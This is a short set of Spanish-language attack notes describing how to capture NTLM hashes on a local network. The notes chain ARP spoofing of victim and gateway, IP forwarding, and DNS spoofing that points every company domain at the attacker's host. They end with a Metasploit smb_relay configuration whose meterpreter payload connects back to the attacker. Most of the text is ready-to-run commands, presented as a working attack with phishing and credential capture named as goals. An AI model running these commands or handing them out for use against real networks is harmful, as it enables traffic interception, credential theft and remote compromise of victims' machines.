Vamos a intentar capturar hashes NTLM con los cuáles podemos hacer PASS the hash attack después. 


## DNS and ARP spoofing

Para ello vamos a interceptar el tráfico de la víctima por ello mediante arpspoofing a la víctima le diremos que somos el gateway y al gateway le diremos que somos la víctima. 

1. Engañamos a la víctima para que nos vea como el gateway

	arpspoof -i eth0 -t <IP_VICTIMA> <IP_GATEWAY>
	2 Engañamos al gateway para que nos vea como la víctima
	arpspoof -i eth0 -t <IP_GATEWAY> <IP_VICTIMA>


2. Habilitamos el reenvío de paquetes y listo, ya el tráfico está pasando por nuestra máquina. 

	`echo 1 > /proc/sys/net/ipv4/ip_forward
`
3. Habilitamos mediante dnspoof un servidor dns falso con todos los dominios de la red apuntando hacia nuestra ip de atacante:
	`dnspoof -i eth0 -f spoof.conf`

	Si la compañía es mycompany.com el fichero sería:
	**Ejemplo de archivo `spoof.conf`:**
	192.168.1.200 *.mycompany.com   
	
   nota: 192.168.1.200 sería nuestra ip de atacante
### **Resultado del ataque**

✅ La víctima pregunta por `google.com`.  
✅ **Nosotros (atacante) respondemos con una IP falsa** (nuestro servidor).  
✅ La víctima se conecta a nuestra IP en lugar del sitio real.  
✅ Podemos hacer phishing, capturar credenciales, o lanzar un ataque SMB Relay si la víctima intenta acceder a un recurso de red.

## SMB Relay attack

Ahora que el tráfico pasa por nosotros y además cuando hagan peticiones DNS nosotros seremos los que les digamos que la IP del servidor que buscan somos nosotros, vamos a crear un servidor SMB con un módulo de metasploit: `exploit/windows/smb/smb_relay`

```
use exploit/windows/smb/smb_relay
set SRVHOST 192.168.1.200  # Nuestra IP (falso servidor SMB)
set LHOST 192.168.1.200  # Parámetro del payload meterpreter
set SMBHOST <ip> # IP del servidor al que queremos acceder mediante smb
run
```
